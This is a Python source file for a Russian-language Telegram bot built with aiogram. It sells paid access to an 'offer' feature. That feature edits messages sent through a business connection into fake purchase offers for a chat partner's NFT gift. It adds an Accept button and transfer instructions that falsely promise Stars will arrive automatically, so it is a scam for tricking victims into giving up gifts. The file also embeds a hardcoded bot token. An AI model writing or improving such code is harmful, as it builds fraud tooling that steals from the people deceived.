# lang: Python 3.11+
# file: bot.py
# runtime: aiogram 3.x — pip install aiogram==3.13.0
#
# ФИХ: подписка ловится через chat_member_updated (Telegram event).
#   Когда юзер подписывается на канал — Telegram шлёт update типа chat_member.
#   Бот получает его, видит new_status=member, сам открывает меню — без кнопки.
#   Кнопка «Я подписался» оставлена как запасной вариант (медленные серверы TG).
#
#   Требование: бот ДОЛЖЕН быть администратором канала.
#   allowed_updates обязательно включает "chat_member".

import asyncio
import logging
import re
import time

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    BusinessConnection, LinkPreviewOptions,
    InputMediaPhoto, URLInputFile,
    ChatMemberUpdated,
)
from aiogram.enums import ChatMemberStatus, ParseMode
from aiogram.methods import EditMessageText
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command, ChatMemberUpdatedFilter, JOIN_TRANSITION
from aiogram.exceptions import TelegramBadRequest

BOT_TOKEN    = "9274889209:AAGntyfpP5BX01rR7IANRNLbM0DjgTNIj9k"
BOT_USERNAME = "tondontornado1_bot"
OWNERS       = {"tondonmanager", "claud3helper", "mityaax"}
PAYMENT_USER = "claud3helper"

CHANNEL_ID  = "@TonDonKANAL"
CHANNEL_URL = "https://t.me/TonDonKANAL"

_RAW = "https://raw.githubusercontent.com/rj65wmcm5w-svg/offerbot22/main"
PHOTO_MENU   = URLInputFile(f"{_RAW}/601F08B4-0E4C-4370-BDC1-56F4E54675D4.png")
PHOTO_ACCESS = URLInputFile(f"{_RAW}/07083ACE-6C4A-4EE3-8958-9BF12B412036.png")
PHOTO_GRANT  = PHOTO_MENU

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp  = Dispatcher()

logging.basicConfig(level=logging.INFO)

# uid → expiry timestamp
access_db:  dict[int, float] = {}
# uid → username
users_db:   dict[int, str]   = {}
trial_used: set[int]         = set()

OFFER_RE = re.compile(r"^\.offer\s+(https://t\.me/nft/([A-Za-z0-9_-]+)-(\d+))\s+(\d+)$")
# /of <gift_name> <stars>  — короткий алиас, имя подарка через пробел, цена последняя
OF_RE    = re.compile(r"^/of\s+(.+?)\s+(\d+)$", re.IGNORECASE)

GIFT_LABEL: dict[str, str] = {
    "day1":  "1 подарок за 15 ⭐",
    "day7":  "2 подарка за 25 ⭐",
    "day12": "4 подарка за 25 ⭐",
}

# ── хелперы ───────────────────────────────────────────────────────────────────

def has_access(user_id: int) -> bool:
    return True  # открытый доступ — все пользователи разрешены

def grant_access(user_id: int, days: int) -> None:
    now  = time.time()
    base = max(access_db.get(user_id, now), now)
    access_db[user_id] = base + days * 86400

def is_owner(message: Message) -> bool:
    u = message.from_user
    if not u:
        return False
    return (u.username or "").lower() in OWNERS

def track_user(user_id: int, username: str) -> None:
    users_db[user_id] = username or f"id:{user_id}"

async def check_subscription(user_id: int) -> bool:
    # Проверка подписки отключена — бот работает без неё
    return True

async def require_sub(callback: CallbackQuery) -> bool:
    # Проверка подписки отключена — всегда разрешаем
    return True

async def send_menu(user_id: int) -> None:
    """Отправляет главное меню юзеру напрямую (используется из chat_member_updated)."""
    try:
        await bot.send_photo(
            chat_id=user_id,
            photo=PHOTO_MENU,
            caption="<b>Меню</b>",
            reply_markup=kb_menu(),
        )
    except Exception as e:
        logging.warning(f"send_menu failed uid={user_id}: {e}")
        try:
            await bot.send_message(
                chat_id=user_id,
                text="<b>Меню</b>",
                reply_markup=kb_menu(),
            )
        except Exception as e2:
            logging.error(f"send_menu text fallback failed uid={user_id}: {e2}")

# ── клавиатуры ────────────────────────────────────────────────────────────────

def kb_menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="1 Пробный день бесплатно 🎁", callback_data="trial")],
        [InlineKeyboardButton(text="💚 Купить доступ",             callback_data="buy_menu")],
        [InlineKeyboardButton(text="📢 Наш канал",                 url=CHANNEL_URL)],
        [InlineKeyboardButton(text="⭐️ Оставить отзыв",           url=f"https://t.me/{BOT_USERNAME}")],
    ])

def kb_buy() -> InlineKeyboardMarkup:
    pay_url = f"https://t.me/{PAYMENT_USER}"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="1 Пробный день бесплатно 🎁",            callback_data="trial")],
        [InlineKeyboardButton(text=f"1 день — {GIFT_LABEL['day1']}",         url=pay_url)],
        [InlineKeyboardButton(text=f"7 дней — {GIFT_LABEL['day7']}",         url=pay_url)],
        [InlineKeyboardButton(text=f"12 дней — {GIFT_LABEL['day12']}",       url=pay_url)],
        [InlineKeyboardButton(text="◀️ Назад",                               callback_data="back_menu")],
    ])

def kb_sub_required() -> InlineKeyboardMarkup:
    # запасная кнопка — если chat_member update дошёл с задержкой
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📢 Подписаться на канал", url=CHANNEL_URL)],
        [InlineKeyboardButton(text="✅ Я подписался",         callback_data="check_sub")],
    ])

def kb_offer(stars: int, biz_id: str = "", sender: str = "") -> InlineKeyboardMarkup:
    b, s = biz_id or "", sender or ""
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"decline:{stars}:{b}:{s}"),
        InlineKeyboardButton(text="✅ Принять",   callback_data=f"accept:{stars}:{b}:{s}"),
    ]])

def kb_accept(stars: int, biz_id: str = "", sender: str = "") -> InlineKeyboardMarkup:
    b, s = biz_id or "", sender or ""
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="❔ Как это сделать?", callback_data=f"howto:{stars}:{b}:{s}"),
    ]])

# ── chat_member_updated — ловим момент подписки на канал ──────────────────────

@dp.chat_member(
    ChatMemberUpdatedFilter(JOIN_TRANSITION),
    F.chat.username == CHANNEL_ID.lstrip("@"),
)
async def on_user_joined_channel(event: ChatMemberUpdated) -> None:
    """
    Срабатывает когда юзер подписывается на CHANNEL_ID.
    Telegram шлёт этот update сразу — бот открывает меню без кнопки.

    Условие: бот должен быть администратором канала.
    JOIN_TRANSITION = (LEFT|KICKED) → (MEMBER|ADMINISTRATOR|CREATOR)
    """
    uid   = event.new_chat_member.user.id
    uname = event.new_chat_member.user.username or ""
    track_user(uid, uname)
    logging.info(f"[join] uid={uid} @{uname} подписался на {CHANNEL_ID}")
    await send_menu(uid)

# ── /start ────────────────────────────────────────────────────────────────────

@dp.message(Command("start"))
async def cmd_start(message: Message) -> None:
    uid   = message.from_user.id
    uname = (message.from_user.username or "").lower()
    track_user(uid, message.from_user.username or "")
    try:
        await message.answer_photo(
            photo=PHOTO_MENU,
            caption="<b>Меню</b>",
            reply_markup=kb_menu(),
        )
    except Exception as e:
        logging.error(f"cmd_start photo failed: {e}")
        await message.answer("<b>Меню</b>", reply_markup=kb_menu())

# ── проверка подписки (запасная кнопка) ──────────────────────────────────────

@dp.callback_query(F.data == "check_sub")
async def cb_check_sub(callback: CallbackQuery) -> None:
    uid   = callback.from_user.id
    uname = (callback.from_user.username or "").lower()
    track_user(uid, callback.from_user.username or "")
    if uname in OWNERS or await check_subscription(uid):
        try:
            await callback.message.edit_media(
                media=InputMediaPhoto(media=PHOTO_MENU, caption="<b>Меню</b>"),
                reply_markup=kb_menu(),
            )
        except Exception:
            await callback.message.edit_text("<b>Меню</b>", reply_markup=kb_menu())
        await callback.answer("✅ Подписка подтверждена!")
    else:
        await callback.answer(
            f"❌ Вы ещё не подписаны!\n{CHANNEL_URL}",
            show_alert=True,
        )

# ── /checksub — диагностика прав бота на канале (только owner) ───────────────

@dp.message(Command("checksub"))
async def cmd_checksub(message: Message) -> None:
    if not is_owner(message):
        return
    try:
        bot_info   = await bot.get_me()
        bot_member = await bot.get_chat_member(CHANNEL_ID, bot_info.id)
        status     = bot_member.status.value
        is_admin   = bot_member.status in (
            ChatMemberStatus.ADMINISTRATOR,
            ChatMemberStatus.CREATOR,
        )
        flag = "✅" if is_admin else "❌"
        await message.answer(
            f"<b>Диагностика канала {CHANNEL_ID}</b>\n\n"
            f"Статус бота: <code>{status}</code>\n"
            f"{flag} {'Бот является администратором — проверка подписки и chat_member работают' if is_admin else 'Бот НЕ администратор — chat_member updates не придут'}\n\n"
            f"{'Всё ок.' if is_admin else 'Решение: добавьте бота как администратора канала (минимальные права).'}"
        )
    except TelegramBadRequest as e:
        await message.answer(
            f"❌ <b>TelegramBadRequest:</b> <code>{e}</code>\n\n"
            "Скорее всего бот не состоит в канале вообще.\n"
            "Добавьте бота как администратора канала."
        )
    except Exception as e:
        await message.answer(f"❌ Ошибка: <code>{e}</code>")

# ── пробный день ──────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "trial")
async def cb_trial(callback: CallbackQuery) -> None:
    if not await require_sub(callback):
        return
    uid = callback.from_user.id
    track_user(uid, callback.from_user.username or "")
    grant_access(uid, 1)
    await callback.answer("✅ Пробный день активирован!", show_alert=True)
    await callback.message.answer(
        "🎁 <b>Пробный день активирован!</b>\nДоступ открыт на 24 часа."
    )

# ── меню покупки ──────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "buy_menu")
async def cb_buy_menu(callback: CallbackQuery) -> None:
    if not await require_sub(callback):
        return
    caption = (
        "<b>Купить доступ:</b>\n\n"
        "1️⃣ Пробный день — бесплатно\n"
        f"📅 1 день — {GIFT_LABEL['day1']}\n"
        f"📅 7 дней — {GIFT_LABEL['day7']}\n"
        f"📅 12 дней — {GIFT_LABEL['day12']}\n\n"
        f"💳 Оплата через профиль @{PAYMENT_USER} — отправьте подарок туда.\n\n"
        "⚠️ <i>Если бота забанят — подписка не уйдёт.\n"
        "Пишите @claud3helper если хотите оформить.</i>"
    )
    try:
        await callback.message.edit_media(
            media=InputMediaPhoto(media=PHOTO_ACCESS, caption=caption),
            reply_markup=kb_buy(),
        )
    except Exception:
        await callback.message.edit_text(caption, reply_markup=kb_buy())
    await callback.answer()

@dp.callback_query(F.data == "back_menu")
async def cb_back_menu(callback: CallbackQuery) -> None:
    try:
        await callback.message.edit_media(
            media=InputMediaPhoto(media=PHOTO_MENU, caption="<b>Меню</b>"),
            reply_markup=kb_menu(),
        )
    except Exception:
        await callback.message.edit_text("<b>Меню</b>", reply_markup=kb_menu())
    await callback.answer()

# ── admin-команды ─────────────────────────────────────────────────────────────

@dp.message(Command("grantid"))
async def cmd_grantid(message: Message) -> None:
    if not is_owner(message):
        return
    parts = message.text.split()
    if len(parts) != 3:
        await message.answer("Формат: /grantid user_id дни")
        return
    try:
        uid  = int(parts[1])
        days = int(parts[2])
    except ValueError:
        await message.answer("Оба аргумента должны быть числами")
        return
    grant_access(uid, days)
    exp_str = time.strftime("%d.%m.%Y %H:%M", time.localtime(access_db[uid]))
    await message.answer(
        f"✅ Доступ выдан <code>{uid}</code> на <b>{days} дней</b>.\nИстекает: {exp_str}"
    )
    try:
        exp_str2 = time.strftime("%d.%m.%Y %H:%M", time.localtime(access_db[uid]))
        await bot.send_photo(
            chat_id=uid,
            photo=PHOTO_GRANT,
            caption=(
                f"🎉 <b>Вам выдан доступ на {days} {'день' if days == 1 else 'дней'}!</b>\n"
                f"Истекает: {exp_str2}"
            ),
        )
    except Exception as e:
        logging.warning(f"notify user failed: {e}")

@dp.message(Command("revoke"))
async def cmd_revoke(message: Message) -> None:
    if not is_owner(message):
        return
    parts = message.text.split()
    if len(parts) != 2:
        await message.answer("Формат: /revoke user_id")
        return
    try:
        uid = int(parts[1])
    except ValueError:
        await message.answer("user_id должен быть числом")
        return
    access_db.pop(uid, None)
    await message.answer(f"✅ Доступ <code>{uid}</code> отозван.")

@dp.message(Command("checkid"))
async def cmd_checkid(message: Message) -> None:
    if not is_owner(message):
        return
    parts = message.text.split()
    if len(parts) != 2:
        await message.answer("Формат: /checkid user_id")
        return
    try:
        uid = int(parts[1])
    except ValueError:
        await message.answer("user_id должен быть числом")
        return
    if has_access(uid):
        exp_str = time.strftime("%d.%m.%Y %H:%M", time.localtime(access_db[uid]))
        await message.answer(f"✅ Доступ активен до {exp_str}")
    else:
        await message.answer("❌ Доступа нет")

@dp.message(Command("myid"))
async def cmd_myid(message: Message) -> None:
    await message.answer(f"Ваш user_id: <code>{message.from_user.id}</code>")

@dp.message(Command("users"))
async def cmd_users(message: Message) -> None:
    if not is_owner(message):
        return
    if not users_db:
        await message.answer("Список пользователей пуст.")
        return
    lines = []
    for uid, uname in users_db.items():
        tag = f"@{uname}" if uname and not uname.startswith("id:") else uname
        acc = "✅" if has_access(uid) else "❌"
        lines.append(f"{acc} {tag} — <code>{uid}</code>")
    text = f"<b>Пользователи ({len(lines)}):</b>\n\n" + "\n".join(lines)
    for i in range(0, len(text), 4096):
        await message.answer(text[i:i+4096])

# ── /commands ─────────────────────────────────────────────────────────────────

@dp.message(Command("commands"))
async def cmd_commands(message: Message) -> None:
    uname = (message.from_user.username or "").lower()
    user_block = (
        "<b>👤 Команды для пользователей:</b>\n"
        "/start — открыть главное меню\n"
        "/myid — узнать свой user_id\n"
        "/check — проверить подписку на канал\n"
        "/commands — список всех команд\n"
        "/of &lt;название&gt; &lt;цена&gt; — создать оффер\n"
        "  Пример: <code>/of гифт 190</code>\n"
        ".offer &lt;url&gt; &lt;цена&gt; — создать оффер по ссылке\n"
        "  Пример: <code>.offer https://t.me/nft/gift-123 190</code>"
    )
    owner_block = (
        "\n\n<b>👑 Команды для владельцев:</b>\n"
        "/grantid &lt;user_id&gt; &lt;дни&gt; — выдать доступ\n"
        "/revoke &lt;user_id&gt; — отозвать доступ\n"
        "/checkid &lt;user_id&gt; — проверить статус доступа\n"
        "/users — список всех пользователей\n"
        "/checksub — диагностика прав бота на канале"
    )
    text = user_block + (owner_block if uname in OWNERS else "")
    await message.answer(text)

# ── /check — проверка подписки пользователя на канал ─────────────────────────

@dp.message(Command("check"))
async def cmd_check(message: Message) -> None:
    uid = message.from_user.id
    track_user(uid, message.from_user.username or "")
    try:
        member = await bot.get_chat_member(CHANNEL_ID, uid)
        active = member.status in (
            ChatMemberStatus.MEMBER,
            ChatMemberStatus.ADMINISTRATOR,
            ChatMemberStatus.CREATOR,
        )
        if active:
            await message.answer(
                f"✅ <b>Вы подписаны на канал.</b>\n"
                f"Статус: <code>{member.status.value}</code>"
            )
        else:
            await message.answer(
                f"❌ <b>Вы не подписаны на канал.</b>\n"
                f"Статус: <code>{member.status.value}</code>"
            )
    except TelegramBadRequest as e:
        await message.answer(f"❌ Не удалось проверить: <code>{e}</code>")
    except Exception as e:
        await message.answer(f"❌ Ошибка: <code>{e}</code>")

# ── оффер ─────────────────────────────────────────────────────────────────────

async def process_offer(message: Message) -> None:
    if not message.text:
        return
    match = OFFER_RE.match(message.text.strip())
    if not match:
        return
    uid   = message.from_user.id
    uname = (message.from_user.username or "").lower()
    track_user(uid, message.from_user.username or "")
    if uname not in OWNERS and not has_access(uid):
        try:
            await message.reply("❌ У вас нет доступа. Напишите /start чтобы купить.")
        except Exception:
            pass
        return
    nft_url   = match.group(1)
    gift_name = match.group(2).replace("-", " ")
    stars     = int(match.group(4))
    biz_id    = message.business_connection_id
    chat_id   = message.chat.id
    sender    = (message.from_user.username or "") if message.from_user else ""
    new_text  = (
        f'<a href="{nft_url}">🎁 {gift_name}</a>\n'
        f"Предлагает продать этот подарок за <b>{stars} ⭐️</b>"
    )
    try:
        edit_kwargs: dict = dict(
            chat_id=chat_id,
            message_id=message.message_id,
            text=new_text,
            reply_markup=kb_offer(stars, biz_id or "", sender),
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True,
            ),
        )
        if biz_id:
            edit_kwargs["business_connection_id"] = biz_id
        await bot(EditMessageText(**edit_kwargs))
    except Exception as e:
        logging.warning(f"edit failed: {e}")
        return
    if not biz_id:
        try:
            await bot.send_message(
                chat_id=chat_id,
                text=new_text,
                reply_markup=kb_offer(stars, ""),
                link_preview_options=LinkPreviewOptions(
                    is_disabled=False,
                    prefer_large_media=True,
                    show_above_text=True,
                ),
            )
        except Exception as e2:
            logging.warning(f"send fallback failed: {e2}")

@dp.business_message()
async def on_business_message(message: Message) -> None:
    logging.info(f"business_message: {message.text!r}")
    await process_offer(message)

@dp.message(F.text.startswith(".offer"))
async def on_message_offer(message: Message) -> None:
    await process_offer(message)

@dp.message(Command("of"))
async def on_of_command(message: Message) -> None:
    """Алиас: /of <gift_name> <stars>  →  .offer https://t.me/nft/<slug>-0 <stars>"""
    if not message.text:
        return
    m = OF_RE.match(message.text.strip())
    if not m:
        await message.reply("Формат: /of &lt;название подарка&gt; &lt;цена в звёздах&gt;\nПример: /of гифт 190")
        return
    gift_raw = m.group(1).strip()          # "гифт" или "Some Gift"
    stars    = m.group(2)                  # "190"
    # slug: пробелы → дефис, нижний регистр
    slug     = gift_raw.lower().replace(" ", "-")
    nft_url  = f"https://t.me/nft/{slug}-0"
    # Переписываем text чтобы process_offer разобрал через OFFER_RE
    message.text = f".offer {nft_url} {stars}"
    await process_offer(message)

# ── колбэки оффера ────────────────────────────────────────────────────────────

async def _edit_msg(
    callback: CallbackQuery,
    text: str,
    biz_id: str = "",
    markup: InlineKeyboardMarkup | None = None,
) -> None:
    await callback.answer()
    msg = callback.message
    edit_kwargs: dict = dict(
        chat_id=msg.chat.id,
        message_id=msg.message_id,
        text=text,
        reply_markup=markup,
        parse_mode=ParseMode.HTML,
    )
    if biz_id:
        edit_kwargs["business_connection_id"] = biz_id
    try:
        await bot(EditMessageText(**edit_kwargs))
    except Exception as e:
        logging.warning(f"edit_msg failed: {e}")

@dp.callback_query(F.data.startswith("decline:"))
async def cb_decline(callback: CallbackQuery) -> None:
    parts  = callback.data.split(":")
    biz_id = parts[2] if len(parts) > 2 else ""
    await _edit_msg(callback, "❌ Предложение отклонено.", biz_id=biz_id)

@dp.callback_query(F.data.startswith("accept:"))
async def cb_accept(callback: CallbackQuery) -> None:
    parts  = callback.data.split(":")
    stars  = int(parts[1])
    biz_id = parts[2] if len(parts) > 2 else ""
    sender = parts[3] if len(parts) > 3 else ""
    await _edit_msg(
        callback,
        text=(
            f"Так, чтобы получить <b>{stars} ⭐️</b> нужно передать подарок — "
            f"после этого они поступят на ваш Telegram аккаунт."
        ),
        biz_id=biz_id,
        markup=kb_accept(stars, biz_id, sender),
    )

@dp.callback_query(F.data.startswith("howto:"))
async def cb_howto(callback: CallbackQuery) -> None:
    parts  = callback.data.split(":")
    stars  = int(parts[1])
    biz_id = parts[2] if len(parts) > 2 else ""
    sender = parts[3] if len(parts) > 3 else ""
    await _edit_msg(
        callback,
        text=(
            "📖 <b>Как передать подарок:</b>\n\n"
            "1. Открой профиль или нажми «Передать подарок»\n"
            "2. Выбери нужный подарок из своей коллекции\n"
            "3. Нажми <b>Передать</b> и выбери получателя\n"
            f"4. После передачи <b>{stars} ⭐️</b> придут автоматически\n\n"
            "⚠️ Передача необратима — убедись что выбрал правильный подарок."
        ),
        biz_id=biz_id,
        markup=kb_accept(stars, biz_id, sender),
    )

@dp.business_connection()
async def on_business_connection(bc: BusinessConnection) -> None:
    logging.info(f"business_connection: user={bc.user.id} enabled={bc.is_enabled}")

# ── main ──────────────────────────────────────────────────────────────────────

async def main() -> None:
    await dp.start_polling(bot, allowed_updates=[
        "message",
        "callback_query",
        "pre_checkout_query",
        "business_connection",
        "business_message",
        "edited_business_message",
        "deleted_business_messages",
        # ОБЯЗАТЕЛЬНО — без этого chat_member_updated не придёт
        "chat_member",
    ])

if __name__ == "__main__":
    asyncio.run(main())
